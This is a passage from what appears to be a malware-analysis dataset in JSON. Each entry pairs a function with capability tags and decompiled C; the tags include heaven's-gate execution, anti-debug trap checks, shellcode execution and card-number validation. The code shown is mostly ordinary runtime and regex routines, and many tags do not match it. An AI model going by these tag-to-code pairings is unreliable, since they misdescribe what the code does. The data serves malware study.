*0x100409b4) * 2 + 0xe5bd;\n    }\n    if ((*0x100409b4 & 0xffff) <= *0x100409b0) {\n        iVar9 = ((iVar9 * 2 + *0x100409b0 * -3) - *0x100409b4) + -23999;\n        *0x100409a4 = *0x100409b4;\n    }\n    if (*0x100409a0 != 9) {\n        cVar4 = cVar4 + param_1 + -0x43;\n    }\n    iVar3 = (-0x5e15 - iVar9) + *0x100409b4 + *0x10040984 * 2;\n    *0x10040984 = CONCAT12(cVar4 + *0x100409b4 * -0x55, iVar3);\n    *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n    return iVar3;\n}\n",
        "token_count": 1094
    },
    "10022a10": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10022a10(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    char cStack4;\n    \n    iVar3 = param_1;\n    if (*0x100409b4 <= *0x10040988) {\n        *0x10040988 = param_1 + *0x100409b4 * -0x55;\n        *0x1004099a = *0x1004099a + iVar3;\n    }\n    iVar1 = *0x100409b0 + *0x10040994;\n    if (iVar1 == 0x130) {\n        uVar2 = *0x10040986 * '\\x02' + 0xbd;\n        *0x10040988 = *0x10040988 + (uVar2 - param_1) + 5;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (*0x10040986 - iVar3) + 5;\n        uVar2 = *0x10040986 * '\\x02' + 0xbd;\n    }\n    cStack4 = iVar1;\n    uVar2 = uVar2 + (cStack4 - ((*0x10040986 - *0x10040980) + -5)) + '\\x05';\n    if (iVar1 == 0x130) {\n        *0x10040986 = uVar2 * '\\x02' + 0xbd;\n        *0x10040988 = *0x10040988 + 5 + (*0x10040986 - param_1);\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (uVar2 - iVar3) + 5;\n        *0x10040986 = uVar2 * '\\x02' + 0xbd;\n    }\n    *0x100409b4 = (iVar1 - *0x10040988) + -5;\n    return;\n}\n",
        "token_count": 452
    },
    "10001f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10001f80(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_1 != param_2) {\n        do {\n            if (param_1 == 0) {\n                return;\n            }\n            iVar2 = param_3;\n    // switch table (10 cases) at 0x1000202c\n            switch(*(param_1 + 4)) {\n            case 10:\n            case 0xb:\n                fcn.10001f80(0);\n                break;\n            case 0x10:\n                if (param_3 != 0) {\n                    *(param_3 + 0x24) = 0;\n                }\n                for (iVar1 = *(param_1 + 0x18); iVar1 != 0; iVar1 = *(iVar1 + 0x18)) {\n                    fcn.10001f80(param_3);\n                }\n                break;\n            case 0x12:\n                iVar2 = param_1;\n                if (param_3 != 0) {\n                    *(param_3 + 0x24) = 0;\n                    *(param_1 + 0x24) = 0;\n                    iVar2 = param_3;\n                }\n                break;\n            case 0x13:\n                if (param_3 == *(param_1 + 0x14)) {\n                    if (*(param_3 + 0x24) == -1) {\n                        *(param_3 + 0x24) = 1;\n                    }\n                    iVar2 = 0;\n                }\n            }\n            param_1 = *(param_1 + 0xc);\n            param_3 = iVar2;\n        } while (param_1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "10007750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007750(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    \n    if (((*(param_1 + 0x50) & 0x100) == 0) || (iVar4 = fcn.100087e0(10, 0x7fffffff),  iVar4 == 0x7fffffff)) {\n        cVar3 = fcn.10007fb0();\n        if (cVar3 != '\\0') {\n            fcn.10007b10(*(param_1 + 0x44));\n            return;\n        }\n        if (((*(param_1 + 0x50) & 0x20000) != 0) && (cVar3 = fcn.10007dc0(),  cVar3 != '\\0')) {\n            return;\n        }\n    }\n    else {\n        uVar1 = *(param_1 + 0x44);\n        if (uVar1 == 0) {\n            if ((*(param_1 + 0x50) & 0x100000) != 0) {\n                fcn.10007b10(0);\n                return;\n            }\n            fcn.1000a231(2);\n        }\n        else if (((((*(param_1 + 0x50) & 0x200) == 0) || (uVar1 < 10)) && (uVar1 <= *(param_1 + 0xc))) &&\n                ((uVar1 <= *(param_1 + 0x20) && *(param_1 + 0x20) != uVar1 &&\n                 ((*(*(param_1 + 0x14) + (uVar1 >> 5) * 4) & 1 << (uVar1 & 0x1f)) != 0)))) {\n            fcn.10008300(uVar1);\n            return;\n        }\n        fcn.1000a231(3);\n    }\n    fcn.1000a231(2);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 473
    },
    "10004710": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x10004785)\n\nvoid __thiscall fcn.10004710(int32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    iVar3 = param_1[1];\n    iVar4 = *param_1;\n    uVar5 = param_2 + 0x1f >> 5;\n    if (uVar5 < iVar3 - iVar4 >> 2) {\n        iVar2 = iVar4 + uVar5 * 4;\n        if (iVar2 == iVar4) {\n            param_1[1] = iVar4;\n        }\n        else if (iVar2 != iVar3) {\n            fcn.1000bc90(iVar2, iVar3, 0);\n            param_1[1] = iVar2;\n        }\n    }\n    param_1[3] = param_2;\n    if ((param_2 & 0x1f) != 0) {\n        puVar1 = *param_1 + uVar5 * 4 + -4;\n        *puVar1 = *puVar1 & (1 << (param_2 & 0x1f)) - 1U;\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "100064c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.100064c0(int32_t param_1, uint16_t *param_2, int32_t param_3)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    \n    if (param_3 == -1) {\n        if ((param_2 == *(param_1 + 0x4c)) && ((*(param_1 + 0x60) & 0x100) == 0)) {\ncode_r0x10006516:\n            return param_2 & 0xffffff00;\n        }\n    }\n    else if (param_3 == 0) {\n        if (param_2 == *(param_1 + 0x50)) goto code_r0x10006516;\n        goto code_r0x100064e2;\n    }\n    param_2 = param_2 + -1;\ncode_r0x100064e2:\n    uVar1 = *param_2;\n    if (uVar1 == uVar1) {\n        iVar2 = fcn.1000cfb0(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_\", uVar1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "100078c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100078c0(int16_t **param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    piVar4 = NULL;\n    piVar5 = 0xffffffff;\n    piVar6 = param_1[0x13];\n    if (piVar6 == 0x2a) goto code_r0x100078de;\n    if (piVar6 == 0x2b) {\n        piVar4 = 0x1;\n        goto code_r0x100078de;\n    }\n    if (piVar6 == 0x3f) {\n        piVar5 = 0x1;\n        goto code_r0x100078de;\n    }\n    if (piVar6 != 0x7b) {\n        return;\n    }\n    fcn.100067a0();\n    iVar3 = fcn.100087e0(10, 0x7fffffff);\n    if (iVar3 == 0x7fffffff) {\n        fcn.1000a231(7);\ncode_r0x100079e0:\n        fcn.1000a231(7);\n        goto code_r0x100079e7;\n    }\n    piVar4 = param_1[0x11];\n    piVar6 = piVar4;\n    if (param_1[0x13] == 0x2c) {\n        fcn.100067a0();\n        if (param_1[0x13] != 0x7d) {\n            cVar2 = fcn.10007da0();\n            if (cVar2 == '\\0') goto code_r0x100079e0;\n            piVar6 = param_1[0x11];\n            goto code_r0x100079b0;\n        }\n    }\n    else {\ncode_r0x100079b0:\n        piVar5 = piVar6;\n        if (param_1[0x13] != 0x7d) goto code_r0x100079e7;\n    }\n    if ((piVar5 == 0xffffffff) || (piVar4 <= piVar5)) {\ncode_r0x100078de:\n        *(param_1[10] + 4) = *(param_1[10] + 4) | 4;\n        piVar6 = *param_1;\n        if (piVar6 != param_1[2]) {\n            if (((*piVar6 == 0x5c) && (piVar6 = piVar6 + 1,  piVar6 != param_1[2])) &&\n               ((((param_1[0x14] & 8) == 0 && ((*piVar6 == 0x28 || (*piVar6 == 0x29)))) ||\n                (((param_1[0x14] & 0x10) == 0 && ((*piVar6 == 0x7b || (*piVar6 == 0x7d)))))))) {\n                *param_1 = piVar6;\n            }\n            *param_1 = *param_1 + 1;\n        }\n        fcn.100054a0();\n        if (((param_1[0x14] & 0x400) != 0) && (param_1[0x13] == 0x3f)) {\n            fcn.100067a0();\n            fcn.10008370(piVar4, piVar5, 0);\n            return;\n        }\n        fcn.10008370(piVar4, piVar5, 1);\n        return;\n    }\ncode_r0x100079e7:\n    fcn.1000a231(7);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 852
    },
    "100087e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.100087e0(int16_t **param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint16_t uVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    param_1[0x11] = NULL;\n    if (param_3 == 0) {\n        return 0;\n    }\n    do {\n        uVar1 = *(param_1 + 0x12);\n        uVar3 = uVar1;\n        if (param_2 == 8) {\n            if (7 < uVar1 - 0x30) {\n                return param_3;\n            }\ncode_r0x10008843:\n            iVar4 = uVar3 - 0x30;\n        }\n        else {\n            if ((0x2f < uVar1) && (uVar3 < 0x3a)) goto code_r0x10008843;\n            if (param_2 != 0x10) {\n                return param_3;\n            }\n            if (uVar1 - 0x61 < 6) {\n                iVar4 = uVar3 - 0x57;\n            }\n            else {\n                if (5 < uVar1 - 0x41) {\n                    return param_3;\n                }\n                iVar4 = uVar3 - 0x37;\n            }\n        }\n        if (iVar4 == -1) {\n            return param_3;\n        }\n        param_3 = param_3 + -1;\n        param_1[0x11] = param_1[0x11] * param_2 + iVar4;\n        piVar2 = *param_1;\n        if (piVar2 != param_1[2]) {\n            if (((*piVar2 == 0x5c) && (piVar2 = piVar2 + 1,  piVar2 != param_1[2])) &&\n               ((((param_1[0x14] & 8) == 0 && ((*piVar2 == 0x28 || (*piVar2 == 0x29)))) ||\n                (((param_1[0x14] & 0x10) == 0 && ((*piVar2 == 0x7b || (*piVar2 == 0x7d)))))))) {\n                *param_1 = piVar2;\n            }\n            *param_1 = *param_1 + 1;\n        }\n        fcn.100054a0();\n        if (param_3 == 0) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 579
    },
    "100088c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.100088c0(int16_t **param_1)\n\n{\n    char cVar1;\n    int16_t *piVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    \n    piVar2 = param_1[0x13];\n    if (piVar2 != 0x5c) {\n        if (piVar2 != 0x5b) {\n            if ((piVar2 != 0x5d) && (piVar2 != 0xffffffff)) {\n                param_1[0x11] = *(param_1 + 0x12);\n                fcn.100067a0();\n                return 1;\n            }\n            return 0;\n        }\n        fcn.100067a0();\n        piVar2 = param_1[0x13];\n        if (((piVar2 != 0x3a) && (piVar2 != 0x3d)) && (piVar2 != 0x2e)) {\n            param_1[0x11] = 0x5b;\n            return 1;\n        }\n        fcn.100067a0();\n        fcn.10009060(piVar2);\n        return 2;\n    }\n    piVar2 = *param_1;\n    if (piVar2 != param_1[2]) {\n        if (((*piVar2 == 0x5c) && (piVar2 = piVar2 + 1,  piVar2 != param_1[2])) &&\n           ((((param_1[0x14] & 8) == 0 && ((*piVar2 == 0x28 || (*piVar2 == 0x29)))) ||\n            (((param_1[0x14] & 0x10) == 0 && ((*piVar2 == 0x7b || (*piVar2 == 0x7d)))))))) {\n            *param_1 = piVar2;\n        }\n        *param_1 = *param_1 + 1;\n    }\n    fcn.100054a0();\n    if ((param_1[0x14] & 0x200000) != 0) {\n        uVar3 = fcn.100091b0(extraout_ECX);\n        return uVar3;\n    }\n    if ((param_1[0x14] & 0x10000) != 0) {\n        cVar1 = fcn.10008a70(*(param_1 + 0x12));\n        if (cVar1 != '\\0') goto code_r0x1000897c;\n    }\n    if ((param_1[0x14] & 0x8000) != 0) {\n        if (*(param_1 + 0x12) == 0x61) {\n            param_1[0x11] = 0x7;\n            fcn.100067a0();\n            return 1;\n        }\n        if (*(param_1 + 0x12) == 0x62) {\n            param_1[0x11] = 0x8;\ncode_r0x1000897c:\n            fcn.100067a0();\n            return 1;\n        }\n    }\n    param_1[0x11] = 0x5c;\n    return 1;\n}\n",
        "token_count": 721
    },
    "1000f700": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.1000f700(int32_t arg_8h)\n\n{\n    if (*0x10040090 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.1000fbfb(*0x10040090);\n        }\n        fcn.1000fc35(*0x10040090, 0);\n        fcn.1000f6e4(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "1001d191": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.1001d191(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x1001d0fc:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    piVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if (iVar1 == 0) break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar4);\n                            *piVar4 = iVar1;\n                            piVar4 = piVar4 + 1;\n                            if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar4 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.10010ea9();\n                    uVar6 = 0x22;\n                    goto code_r0x1001d0ea;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x1001d0fc;\n    puVar2 = fcn.10010ea9();\n    uVar6 = 0x16;\ncode_r0x1001d0ea:\n    *puVar2 = uVar6;\n    fcn.10010dcf();\n    return uVar6;\n}\n",
        "token_count": 624
    },
    "1001e548": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.1001e548(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x1001e4cb:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    pcVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if ((cVar1 == '\\0') || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.10010ea9();\n                    uVar6 = 0x22;\n                    goto code_r0x1001e4b9;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x1001e4cb;\n    puVar2 = fcn.10010ea9();\n    uVar6 = 0x16;\ncode_r0x1001e4b9:\n    *puVar2 = uVar6;\n    fcn.10010dcf();\n    return uVar6;\n}\n",
        "token_count": 621
    },
    "1001f47b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.1001f47b(void)\n\n{\n    if (*0x10040970 == -2) {\n        fcn.1001f45c();\n    }\n    return *0x10040970 != -1;\n}\n",
        "token_count": 51
    },
    "1001f49a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1001f49a(void)\n\n{\n    if ((*0x10040970 != -1) && (*0x10040970 != -2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x10040970);\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "10003100": {
        "rules": [
            "check for trap flag exception/d5d4160e77a5474aa5157e4631e4f1b3"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.10003100(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint8_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_90h;\n    uint var_8ch;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_50h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a89b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = *in_EDX;\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 0;\n    }\n    uVar5 = 0;\n    fcn.10003590(arg_8h, arg_ch, in_EDX + 1, iVar1, *(iVar1 + 0x1c), *(iVar1 + 0x14), arg_10h);\n    var_4h = 0;\n    cVar2 = fcn.10003f70();\n    if (cVar2 == '\\0') {\n        if ((arg_8h == arg_ch) || ((arg_10h & 0x40) != 0)) goto code_r0x1000323d;\n        piVar3 = fcn.10003c90(&var_10h, arg_8h + 2, arg_ch, 0);\n        iVar1 = *piVar3;\n        while (iVar1 != arg_ch) {\n            cVar2 = fcn.10003f70();\n            if (cVar2 != '\\0') goto code_r0x10003226;\n            piVar3 = fcn.10003c90();\n            iVar1 = *piVar3;\n        }\n        cVar2 = fcn.10003f70();\n        if (cVar2 == '\\0') goto code_r0x1000323d;\n    }\ncode_r0x10003226:\n    uVar5 = 1;\n    if (in_ECX != NULL) {\n        *in_ECX = arg_14h;\n        in_ECX[5] = arg_8h;\n        *(in_ECX + 7) = arg_8h != in_ECX[6];\n    }\ncode_r0x1000323d:\n    fcn.100037e0();\n    fcn.100037e0();\n    fcn.10003a70();\n    fcn.100037e0();\n    uVar4 = fcn.10003a70();\n    *in_FS_OFFSET = var_ch;\n    return uVar4 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 691
    },
    "10003590": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.10003590(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a90e;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *in_ECX = 0;\n    var_10h = 0;\n    in_ECX[1] = 0;\n    in_ECX[2] = 0;\n    in_ECX[3] = 0;\n    fcn.10003b50(0, &var_10h, uVar2);\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    in_ECX[6] = 0;\n    in_ECX[7] = 0;\n    var_4h = 0;\n    in_ECX[8] = 0;\n    var_10h = 0;\n    in_ECX[9] = 0;\n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    fcn.10003b50(0, &var_10h);\n    in_ECX[0xc] = 0;\n    in_ECX[0xd] = 0;\n    in_ECX[0xe] = 0;\n    in_ECX[0xf] = 0;\n    in_ECX[0x10] = 0;\n    in_ECX[0x11] = 0;\n    in_ECX[0x12] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    in_ECX[0x13] = 0;\n    in_ECX[0x14] = arg_ch;\n    in_ECX[0x15] = arg_8h;\n    in_ECX[0x17] = arg_1ch;\n    in_ECX[0x16] = arg_14h;\n    in_ECX[0x18] = arg_20h;\n    *(in_ECX + 0x19) = 0;\n    in_ECX[0x1a] = arg_18h;\n    if (((*(arg_14h + 8) & 8) == 0) || ((arg_20h & 0x10) != 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_ECX + 0x1b) = uVar1;\n    in_ECX[0x1c] = arg_10h;\n    fcn.10003860(*(arg_14h + 0x18));\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 735
    },
    "100057f0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100057f0(int32_t param_1, code *param_2)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    code *pcVar3;\n    \n    iVar1 = *(param_2 + 4);\n    if (iVar1 == 8) {\n        pcVar3 = 0x9;\n    }\n    else if (iVar1 == 10) {\n        pcVar3 = 0xc;\n    }\n    else {\n        pcVar3 = (iVar1 != 0xb) * 2 + 0xc;\n    }\n    ppcVar2 = fcn.1000ac95(0x18);\n    ppcVar2[4] = NULL;\n    ppcVar2[1] = pcVar3;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    *ppcVar2 = vtable.std::_Node_end_group.0;\n    ppcVar2[5] = param_2;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar3 = *(*(param_1 + 4) + 0xc);\n    if (pcVar3 != NULL) {\n        ppcVar2[3] = pcVar3;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 353
    },
    "1000a61b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.1000a61b(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x1002a730;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    while (*0x10040008 < 10) {\n        iVar1 = *0x10040008 * 4;\n        *0x10040008 = *0x10040008 + 1;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*(iVar1 + 0x10040ef8), uVar2);\n        if (pcVar3 != NULL) {\n            fcn.1000b359();\n            (*pcVar3)();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 243
    },
    "10003f70": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuchar __thiscall fcn.10003f70(uint *param_1, uint *param_2)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    uint uVar3;\n    uint *extraout_ECX;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint *unaff_EDI;\n    int32_t iVar6;\n    \n    puVar4 = param_1;\n    if (param_2 != NULL) {\n        *(param_2 + 1) = 1;\n        fcn.10004610(0);\n        puVar4 = extraout_ECX;\n    }\n    param_1[0x13] = param_1[0x15];\n    *param_1 = param_1[0x15];\n    fcn.100043b0(param_1[0x1a], puVar4);\n    fcn.10004350(param_1[0x1a]);\n    *(param_1 + 0x1d) = 0;\n    param_1[0x1e] = 10000000;\n    param_1[0x1f] = 1000;\n    *(param_1 + 0x65) = param_2 != NULL;\n    *(param_1 + 0x19) = 0;\n    cVar2 = fcn.10005050(param_1[0x16]);\n    if (cVar2 != '\\0') {\n        if (param_2 != NULL) {\n            ppiVar1 = param_2 + 2;\n            fcn.10004610(param_1[0x1a]);\n            uVar5 = 0;\n            if (param_1[0x1a] != 0) {\n                iVar6 = 0;\n                do {\n                    if ((*(param_1[9] + (uVar5 >> 5) * 4) & 1 << (uVar5 & 0x1f)) == 0) {\n                        *(iVar6 + 8 + *ppiVar1) = 0;\n                        *(iVar6 + *ppiVar1) = param_1[0x14];\n                        uVar3 = param_1[0x14];\n                    }\n                    else {\n                        *(iVar6 + 8 + *ppiVar1) = 1;\n                        *(iVar6 + *ppiVar1) = *(param_1[0xd] + uVar5 * 8);\n                        uVar3 = *(param_1[0xd] + 4 + uVar5 * 8);\n                    }\n                    uVar5 = uVar5 + 1;\n                    *(iVar6 + 4 + *ppiVar1) = uVar3;\n                    iVar6 = iVar6 + 0xc;\n                    param_2 = unaff_EDI;\n                } while (uVar5 < param_1[0x1a]);\n            }\n            *param_2 = param_1[0x13];\n            param_2[5] = param_1[0x13];\n            iVar6 = **ppiVar1;\n            param_2[6] = iVar6;\n            *(param_2 + 7) = param_2[5] != iVar6;\n            param_2[8] = (*ppiVar1)[1];\n            iVar6 = param_1[0x14];\n            param_2[9] = iVar6;\n            *(param_2 + 10) = param_2[8] != iVar6;\n            param_2[0xb] = param_1[0x14];\n            param_2[0xc] = param_1[0x14];\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 806
    },
    "100043b0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100043b0(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uStack32;\n    uint auStack28 [2];\n    uchar auStack20 [4];\n    uchar auStack16 [16];\n    \n    uStack32 = uStack32 & 0xffffff00;\n    uVar1 = param_1[3];\n    if (uVar1 < param_2) {\n        uVar7 = *param_1;\n        uVar6 = 0;\n        if (uVar1 != 0) {\n            if ((uVar1 < 0) && (uVar1 != 0)) {\n                iVar4 = (-uVar1 - 1 >> 5) * -4 + -4;\n            }\n            else {\n                iVar4 = (uVar1 >> 5) * 4;\n            }\n            uVar7 = uVar7 + iVar4;\n            uVar6 = uVar1 & 0x1f;\n        }\n        fcn.10004790(auStack28, param_2 - uVar1, &uStack32, uVar7, uVar6);\n        return;\n    }\n    if (param_2 < uVar1) {\n        puVar5 = fcn.10004a30(auStack20);\n        auStack28[0] = 0;\n        uVar2 